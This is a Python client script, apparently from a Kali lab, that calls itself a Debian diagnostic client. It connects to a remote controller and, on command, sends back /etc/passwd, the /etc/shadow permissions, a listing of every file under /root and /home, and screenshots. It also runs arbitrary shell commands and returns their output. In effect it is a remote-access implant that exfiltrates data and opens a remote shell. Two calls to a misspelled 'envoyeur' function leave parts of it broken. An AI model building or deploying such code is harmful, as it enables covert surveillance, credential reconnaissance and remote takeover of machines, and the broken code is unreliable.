import argparse
import json
import platform
import socket
import uuid
import os
import io
import base64
import subprocess
import psutil
from PIL import ImageGrab

def envoyer(sock, type_message, data=None, identifiant=None):
    message = {
        "type": type_message,
        "id": identifiant or str(uuid.uuid4()),
        "data": data if data is not None else {}
    }
    sock.sendall((json.dumps(message) + "\n").encode("utf-8"))

def recevoir(fichier):
    ligne = fichier.readline(1024 * 1024 + 1)
    
    if not ligne:
        return None
    
    if len(ligne) > 1024 * 1024 or not ligne.endswith(b"\n"):
        raise ValueError("Message incomplet ou trop volumineux")
    
    message = json.loads(ligne.decode("utf-8"))
    
    if not isinstance(message, dict):
        raise ValueError("Message JSON invalide")
    
    return message

def main():
    parser = argparse.ArgumentParser(
        description="Client de diagnostic Debian pour Kali V5"
    )
    parser.add_argument("--ip", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5001)
    args = parser.parse_args()
    
    nom = socket.gethostname()
    
    print(f"[DEBIAN] Connexion vers {args.ip}:{args.port}")
    
    with socket.create_connection((args.ip, args.port), timeout=15) as client:
        client.settimeout(15)
        
        with client.makefile("rb") as fichier:
            envoyer(client, "hello", {
                "name": nom,
                "os": "Linux",
                "ips": [],
                "version": "1.0"
            })
            
            confirmation = recevoir(fichier)
            
            if not confirmation or confirmation.get("type") != "hello_ack":
                raise ValueError("Confirmation HELLO invalide")
            
            print("[DEBIAN] HELLO_ACK reçu")
            
            while True:
                message = recevoir(fichier)
                
                if message is None:
                    print("[DEBIAN] Session terminée par Kali")
                    break
                
                type_message = message.get("type")
                identifiant = message.get("id")
                
                if not isinstance(identifiant, str):
                    raise ValueError("Identifiant de message invalide")
                
                # 1. PING
                if type_message == "ping":
                    envoyer(client, "pong", {}, identifiant)
                    print("[DEBIAN] PONG envoyé")
                
                # 2. SYSINFO
                elif type_message == "sysinfo":
                    infos = {
                        "hostname": nom,
                        "os": platform.system(),
                        "release": platform.release(),
                        "architecture": platform.machine(),
                        "python": platform.python_version()
                    }
                    envoyer(client, "result", {"ok": True, "payload": {"info": infos}}, identifiant)
                    print("[DEBIAN] SYSINFO envoyé")
                
                # 3. INTERFACES (Sans localhost)
                elif type_message == "interfaces":
                    infos = []
                    for nom_if, addrs in psutil.net_if_addrs().items():
                        if nom_if == "lo": # <-- On exclut localhost
                            continue
                        for addr in addrs:
                            if addr.family == socket.AF_INET:
                                infos.append(f"{nom_if} : {addr.address}")
                    envoyeur(client, "result", {"ok": True, "payload": {"interfaces": "\n".join(infos)}}, identifiant)
                    print("[DEBIAN] INTERFACES envoyées")

                # 4. PASSWD
                elif type_message == "passwd":
                    try:
                        with open("/etc/passwd", "r") as f:
                            contenu = f.read()
                        envoyer(client, "result", {"ok": True, "payload": {"passwd": contenu}}, identifiant)
                        print("[DEBIAN] PASSWD envoyé")
                    except Exception as e:
                        envoyer(client, "error", {"code": "ERR_PASSWD", "message": str(e)}, identifiant)

                # 5. SHADOW (Permissions uniquement)
                elif type_message == "shadow":
                    try:
                        stat_info = os.stat("/etc/shadow")
                        res = f"Permissions : {oct(stat_info.st_mode)[-3:]}\nUID : {stat_info.st_uid}"
                        envoyer(client, "result", {"ok": True, "payload": {"shadow": res}}, identifiant)
                        print("[DEBIAN] SHADOW envoyé")
                    except Exception as e:
                        envoyer(client, "error", {"code": "ERR_SHADOW", "message": str(e)}, identifiant)

                # 6. WALK (Sans limite)
                elif type_message == "walk":
                    try:
                        fichiers = []
                        for root_dir in ["/root", "/home"]:
                            for root, dirs, files in os.walk(root_dir):
                                for file in files:
                                    fichiers.append(os.path.join(root, file))
                        res = "\n".join(fichiers) # <-- Plus de limite
                        envoyer(client, "result", {"ok": True, "payload": {"walk": res}}, identifiant)
                        print("[DEBIAN] WALK envoyé")
                    except Exception as e:
                        envoyer(client, "error", {"code": "ERR_WALK", "message": str(e)}, identifiant)

                # 7. SCREENSHOT
                elif type_message == "screenshot":
                    try:
                        img = ImageGrab.grab()
                        buffer = io.BytesIO()
                        img.save(buffer, format="PNG")
                        b64_img = base64.b64encode(buffer.getvalue()).decode('utf-8')
                        envoyeur(client, "result", {"ok": True, "payload": {"screenshot": b64_img}}, identifiant)
                        print("[DEBIAN] SCREENSHOT envoyé")
                    except Exception as e:
                        envoyer(client, "error", {"code": "ERR_SCREEN", "message": str(e)}, identifiant)
                
                # 8. CMD (Exécution de commandes Shell)
                elif type_message == "cmd":
                    commande = message.get("data", {}).get("cmd", "")
                    try:
                        res = subprocess.run(commande, shell=True, capture_output=True, text=True)
                        sortie = res.stdout if res.stdout else res.stderr
                        envoyer(client, "result", {"ok": True, "payload": {"cmd": sortie}}, identifiant)
                        print(f"[DEBIAN] CMD exécutée : {commande}")
                    except Exception as e:
                        envoyer(client, "error", {"code": "ERR_CMD", "message": str(e)}, identifiant)
                
                # 9. Erreur par défaut
                else:
                    envoyer(client, "error", {
                        "code": "UNSUPPORTED",
                        "message": "Diagnostic non autorisé"
                    }, identifiant)
                    print(f"[DEBIAN] Message non pris en charge : {type_message}")

if __name__ == "__main__":
    try:
        main()
    except (OSError, ValueError, json.JSONDecodeError) as erreur:
        print(f"[ERREUR] {erreur}")
